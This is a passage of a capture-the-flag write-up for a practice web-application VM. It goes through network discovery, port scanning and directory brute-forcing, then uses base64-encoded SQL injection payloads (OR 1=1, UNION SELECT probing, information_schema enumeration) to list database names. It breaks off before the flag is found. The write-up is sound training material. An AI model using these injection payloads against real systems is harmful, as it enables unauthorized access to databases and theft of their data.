
**Challenge Type** : _Blackbox Testing_


**Challenge Description** :

Download the VM and start it. It has a web application hosted which is configured to boot at start so you can put the VM in the background. 
Simply find the address of the application and start pentesting.


**Challenge Goal** :
_Find the file `flag.txt` and read its content._

---

First we start by finding the IP of machine here i used the `netdiscover` command.

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $sudo netdiscover -r 192.168.1.12/24
Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.4     **:**:**:**:**:**      1      60  CHONGQING FUGUI ELECTRONICS 
 192.168.1.1     **:**:**:**:**:**      1      60  Syrotech Networks. Ltd.     
 192.168.1.5     **:**:**:**:**:**      1      60  Intel Corporate             
 192.168.1.21    **:**:**:**:**:**      1      60  Intel Corporate             

```
here `192.168.1.1` is ip of router.

we scane the IP `192.168.1.5`,`192.168.1.21` and the IP `192.168.1.21` have web service running at port 42710.

I use `rustscan` for port scaning in CTFs because it is insanely fast.

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $rustscan -a 192.168.1.21
File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 192.168.1.21:42710
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
...
```
opening this website we have nothing but this page:

<img width="397" alt="image" src="https://user-images.githubusercontent.com/79740895/208959026-568a1c93-0751-4386-9bf7-79a56ddbbabc.png">

First though was to look for `robots.txt` file but no luck so i did directory bruteforcing with gobuster.

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $gobuster dir -u http://192.168.1.21:42710/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.21:42710/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/12/21 22:09:58 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/Admin                (Status: 301) [Size: 321] [--> http://192.168.1.21:42710/Admin/]
/assets               (Status: 301) [Size: 322] [--> http://192.168.1.21:42710/assets/]
/includes             (Status: 301) [Size: 324] [--> http://192.168.1.21:42710/includes/]
/index.php            (Status: 200) [Size: 349]                                          
/search_result        (Status: 301) [Size: 329] [--> http://192.168.1.21:42710/search_result/]
/server-status        (Status: 403) [Size: 280]                                               
                                                                                              
===============================================================
2022/12/21 22:10:05 Finished
===============================================================

```

now we have some interesting directories like Admin and search_result.

Admin page requires authentication Username and Password.

http://192.168.1.21:42710/search_result/  

<img width="240" alt="image" src="https://user-images.githubusercontent.com/79740895/208960036-f154d56c-5bbf-4b35-8d97-b39dcf34c217.png">

now this is something interesting there is link to http://192.168.1.21:42710/search_result/result_2022.php

<img width="544" alt="image" src="https://user-images.githubusercontent.com/79740895/208960308-7fa28195-3dc5-40ec-b877-5b1922e29dcf.png">

_The Results of 2022 have not been published yet_ so let's try 2021 : http://192.168.1.21:42710/search_result/result_2021.php

<img width="913" alt="image" src="https://user-images.githubusercontent.com/79740895/208960741-f610c650-98f4-40dd-87dd-5102f9e3e1ee.png">

on submitting the form we have this response:

<img width="916" alt="image" src="https://user-images.githubusercontent.com/79740895/208962242-acde389b-6d0b-4746-9508-19670e187ebc.png">

`ID,	Name,	Roll,	Marks` it looks like it is fetching this data from sql database so lets try SQL injection.

this POST request have `data=NjIxNzI5NTgx` it base64 encoded value of `621729581`.

lets try with simple payload `' OR 1=1 #` but it not working after few tries i tried `621729581 OR 1=1` base64 encode and it gives us all the entries hooray,
and that is successful SQL injection.

payload= `data=<@base64>621729581 OR 1=1<@/base64>`  <-- I'm using Hackvertor burp extension.

<img width="918" alt="image" src="https://user-images.githubusercontent.com/79740895/208964245-b65f25db-f151-4791-8cf1-c43d3a977d9d.png">

we know the number of columns it is 4 : `ID,	Name,	Roll,	Marks`.So the payload for union attack would be:

payload: `data=<@base64>621729581 UNION SELECT NULL, NULL, NULL, NULL<@/base64>`

It gives us the result in response so payload is correct and we also know the data types it should be Integer for ID, Roll, Marks and String for Name so we can put this values in payload.

payload: `data=<@base64>621729581 UNION SELECT 1, "name", 2, 3<@/base64>`

response:

<img width="174" alt="image" src="https://user-images.githubusercontent.com/79740895/208965679-8c116a48-31b5-4c6c-a8d8-d7e39ae5c49a.png">

Now we can try to extract the databases'name, tables'name, columns'name.

Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

payload: `data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,schema_name,0x7c), 2, 3 fRoM information_schema.schemata<@/base64>`

response:

`|mysql|,|information_schema|,|performance_schema|,|sys|,|ezbox|`




